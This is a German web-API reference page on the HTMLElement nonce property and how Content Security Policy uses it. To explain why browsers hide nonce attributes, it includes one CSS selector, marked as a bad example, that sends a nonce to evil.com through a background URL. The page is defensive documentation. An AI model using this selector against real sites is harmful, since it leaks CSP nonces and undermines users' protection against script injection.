---
title: "HTMLElement: nonce-Eigenschaft"
short-title: nonce
slug: Web/API/HTMLElement/nonce
l10n:
  sourceCommit: a3d9f61a8990ba7b53bda9748d1f26a9e9810b18
---

{{APIRef("HTML DOM")}}

Die **`nonce`**-Eigenschaft der [`HTMLElement`](/de/docs/Web/API/HTMLElement)-Schnittstelle gibt die einmal verwendete kryptografische Nummer zurück, die von der [Content Security Policy](/de/docs/Web/HTTP/CSP) verwendet wird, um zu bestimmen, ob ein bestimmtes Abrufen fortgesetzt werden darf.

In späteren Implementierungen geben Elemente ihr `nonce`-Attribut nur noch an Skripte weiter (und nicht an Seitkanäle wie CSS-Attributselektoren).

## Beispiele

### Abrufen eines nonce-Wertes

In der Vergangenheit unterstützten nicht alle Browser das `nonce` IDL-Attribut, daher war ein Workaround der Versuch, [`getAttribute`](/de/docs/Web/API/Element/getAttribute) als Fallback zu verwenden:

```js
let nonce = script["nonce"] || script.getAttribute("nonce");
```

Jedoch verbergen neuere Browserversionen `nonce`-Werte, die auf diese Weise abgerufen werden (ein leerer String wird zurückgegeben). Die IDL-Eigenschaft (`script['nonce']`) wird der einzige Weg sein, um Nonces zuzugreifen.

Das Verbergen von Nonces hilft, Angreifer daran zu hindern, nonce-Daten über Mechanismen zu exfiltrieren, die Daten aus Inhaltsattributen holen können, wie dieser CSS-Selektor:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`nonce` globales Attribut](/de/docs/Web/HTML/Global_attributes/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/CSP)
- CSP: {{CSP("script-src")}}
